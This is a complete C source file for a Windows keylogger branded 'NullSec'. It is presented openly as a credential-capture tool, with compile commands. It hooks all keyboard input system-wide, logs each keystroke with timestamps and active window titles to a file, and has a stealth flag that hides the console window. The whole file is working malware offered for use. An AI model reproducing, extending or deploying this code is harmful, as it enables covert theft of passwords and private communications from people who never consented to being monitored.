/*
 * NullSec Windows Keylogger
 * Low-level keyboard hook for credential capture
 * Compile: cl.exe /O2 keylogger.c /link user32.lib
 * Or: x86_64-w64-mingw32-gcc -o nullsec-keylog.exe keylogger.c -luser32
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>

HHOOK keyboard_hook;
FILE* log_file = NULL;
int running = 1;
char current_window[256] = "";

const char* get_key_name(int vk_code, int shift) {
    static char key[32];
    
    // Special keys
    switch (vk_code) {
        case VK_RETURN: return "[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return " ";
        case VK_DELETE: return "[DEL]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_CONTROL: return "";
        case VK_SHIFT: return "";
        case VK_MENU: return ""; // Alt
        case VK_CAPITAL: return "[CAPS]";
    }
    
    // Letters
    if (vk_code >= 'A' && vk_code <= 'Z') {
        int caps = GetKeyState(VK_CAPITAL) & 1;
        int upper = (shift || caps) && !(shift && caps);
        key[0] = upper ? vk_code : vk_code + 32;
        key[1] = '\0';
        return key;
    }
    
    // Numbers (with shift symbols)
    if (vk_code >= '0' && vk_code <= '9') {
        if (shift) {
            char* symbols = ")!@#$%^&*(";
            key[0] = symbols[vk_code - '0'];
        } else {
            key[0] = vk_code;
        }
        key[1] = '\0';
        return key;
    }
    
    // Other symbols
    switch (vk_code) {
        case VK_OEM_1: return shift ? ":" : ";";
        case VK_OEM_PLUS: return shift ? "+" : "=";
        case VK_OEM_COMMA: return shift ? "<" : ",";
        case VK_OEM_MINUS: return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2: return shift ? "?" : "/";
        case VK_OEM_3: return shift ? "~" : "`";
        case VK_OEM_4: return shift ? "{" : "[";
        case VK_OEM_5: return shift ? "|" : "\\";
        case VK_OEM_6: return shift ? "}" : "]";
        case VK_OEM_7: return shift ? "\"" : "'";
    }
    
    return "";
}

void log_window_change() {
    char new_window[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, new_window, sizeof(new_window));
    
    if (strcmp(new_window, current_window) != 0) {
        strcpy(current_window, new_window);
        
        time_t now = time(NULL);
        struct tm* tm_info = localtime(&now);
        char timestamp[32];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
        
        if (log_file) {
            fprintf(log_file, "\n\n[%s] Window: %s\n", timestamp, new_window);
            fflush(log_file);
        }
        printf("\n[*] Window: %s\n", new_window);
    }
}

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        
        int shift = GetKeyState(VK_SHIFT) & 0x8000;
        const char* key = get_key_name(kbd->vkCode, shift);
        
        if (key[0] != '\0') {
            log_window_change();
            
            if (log_file) {
                fprintf(log_file, "%s", key);
                fflush(log_file);
            }
            printf("%s", key);
            fflush(stdout);
        }
    }
    
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

void start_keylogger(const char* output_path) {
    if (output_path) {
        log_file = fopen(output_path, "a");
        if (!log_file) {
            printf("[!] Cannot open log file: %s\n", output_path);
            return;
        }
        printf("[+] Logging to: %s\n", output_path);
    }
    
    printf("[*] Starting keylogger... (Ctrl+C to stop)\n\n");
    
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_callback, NULL, 0);
    
    if (!keyboard_hook) {
        printf("[!] Failed to install hook (Error: %lu)\n", GetLastError());
        return;
    }
    
    MSG msg;
    while (running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboard_hook);
    
    if (log_file) {
        fclose(log_file);
    }
}

#endif

void banner() {
    printf("\n+=======================================+\n");
    printf("|   NullSec Keylogger - Windows         |\n");
    printf("|   Fast C-based keyboard capture       |\n");
    printf("+=======================================+\n");
}

void usage(const char* prog) {
    printf("\nUsage: %s [options]\n\n", prog);
    printf("Options:\n");
    printf("  -o, --output <file>     Log keystrokes to file\n");
    printf("  -s, --stealth           Run hidden (no console)\n");
    printf("  -h, --help              Show this help\n");
    printf("\nExamples:\n");
    printf("  %s                       # Log to console only\n", prog);
    printf("  %s -o keylog.txt         # Log to file\n", prog);
}

int main(int argc, char* argv[]) {
    banner();
    
#ifndef _WIN32
    printf("\n[!] This tool only works on Windows\n");
    printf("[*] Cross-compile with: x86_64-w64-mingw32-gcc -o keylog.exe keylogger.c -luser32\n");
    return 1;
#else
    
    char* output_path = NULL;
    int stealth = 0;
    
    for (int i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-o") == 0 || strcmp(argv[i], "--output") == 0) && i + 1 < argc) {
            output_path = argv[++i];
        } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--stealth") == 0) {
            stealth = 1;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            usage(argv[0]);
            return 0;
        }
    }
    
    if (stealth) {
        // Hide console window
        HWND console = GetConsoleWindow();
        ShowWindow(console, SW_HIDE);
    }
    
    start_keylogger(output_path);
    
    return 0;
#endif
}
